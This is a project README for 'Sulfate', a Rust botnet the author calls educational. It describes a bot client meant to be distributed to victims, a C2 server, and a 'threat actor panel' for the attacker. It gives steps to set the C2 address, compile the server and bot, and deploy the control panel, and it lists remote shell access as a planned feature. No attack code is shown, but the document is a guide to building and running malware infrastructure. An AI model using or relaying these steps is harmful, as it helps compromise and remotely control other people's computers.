# Sulfate

A powerful, multi-featured, educational botnet.

The successor of [Sulphur], now written in Rust.

[Sulphur]: https://github.com/Nk125/Sulphur

# Features

I'm still working on them, but every feature from Sulphur is planned to be here.

## Configuration

* Server config customization with .env:

You can customize the server using env variables or modifying the .env file:

```bash
cargo run --release --bin server

# Or modify the input with env variables
export SULFATE_SERVER_LISTEN_ADDR=0.0.0.0:80
cargo run --release --bin server
```

* Client C2 address

Modify the file in `client/src/build_config.rs` to insert your own hostname:

```rust
/// C2 hostname and port.
const C2_ADDRESS: &str = "127.0.0.1:5566";
```

## TO-DOs

Short-term planned features:

* Get basic client system info.

* Remote shell access to the client.

* Customizable builder.

## Improvements

- GUI support:
	- Now you can manage the clients from an intuitive interface.

# Project structure

The project is divided in several crates:

* Client: This executable is distributed to the bots.

* Server: Where the bots are managed (C2 server), this server has APIs which can be consumed by the consumer.

* Consumer: The threat actor panel, the attacker can contact with the server via this interface.

* Core: Several useful data structures for every crate (bundled with the other crates).

# Compilation

Compilation steps are straightforward, with additional work for the consumer UI.

First of all clone this repository with git:

```bash
git clone https://github.com/nk125/sulfate
```

For every project a [rust](https://rustup.rs) installation required.

## Server and Client

These have normal compilation steps:

```bash
# Compile C2 Server
cargo build --release --bin server

# Compile bot
cargo build --release --bin client
```

See the artifacts in `target/release`

## Consumer

The consumer is a bit special, as it is a dioxus project.

You need to install [Dioxus] following the steps in the doc page.

The project is meant to be deployed as a web app and not as a native app to reduce the dependencies in your computer.

[Dioxus]: https://dioxuslabs.com/learn/0.7/getting_started/

Go to the consumer directory and serve the web app:

```bash
cd consumer
# Deploys to the web by default
dx serve
```

To distribute the consumer artifacts, use the bundle subcommand:

```bash
cd consumer
dx bundle --web
```

This command will generate the frontend files in `public` directory, ready to be served.
